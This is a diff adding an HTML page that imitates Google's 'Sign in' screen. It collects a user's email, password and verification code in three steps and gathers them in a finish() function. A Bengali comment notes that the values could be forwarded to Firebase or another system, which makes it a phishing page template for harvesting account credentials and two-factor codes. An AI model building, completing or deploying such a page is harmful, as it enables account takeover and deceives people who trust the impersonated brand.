@@ -1,0 +1,103 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Sign in – Google Accounts</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 40px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+    }
+    .step { display: none; }
+    .step.active { display: block; }
+    h2 {
+      font-weight: 400;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #1a73e8;
+      color: #fff;
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      float: right;
+    }
+    .back-btn {
+      float: left;
+      background: none;
+      color: #1a73e8;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      padding: 0;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- Step 1: Email -->
+  <div id="step1" class="step active">
+    <h2>Sign in</h2>
+    <input type="email" id="email" placeholder="Email or phone" required />
+    <button onclick="nextStep(2)">Next</button>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div id="step2" class="step">
+    <h2>Welcome</h2>
+    <input type="password" id="password" placeholder="Enter your password" required />
+    <button class="back-btn" onclick="nextStep(1)">← Back</button>
+    <button onclick="nextStep(3)">Next</button>
+  </div>
+
+  <!-- Step 3: Verification -->
+  <div id="step3" class="step">
+    <h2>Verify it’s you</h2>
+    <input type="text" id="code" placeholder="Enter verification code" required />
+    <button class="back-btn" onclick="nextStep(2)">← Back</button>
+    <button onclick="finish()">Finish</button>
+  </div>
+</div>
+
+<script>
+  function nextStep(step) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    document.getElementById('step' + step).classList.add('active');
+  }
+
+  function finish() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    const code = document.getElementById('code').value;
+
+    alert(`✅ Submitted:\nEmail: ${email}\nPassword: ${pass}\nCode: ${code}`);
+
+    // এখানে চাইলে Firebase বা অন্য সিস্টেমে পাঠানো যাবে
+  }
+</script>
+
+</body>
+</html>
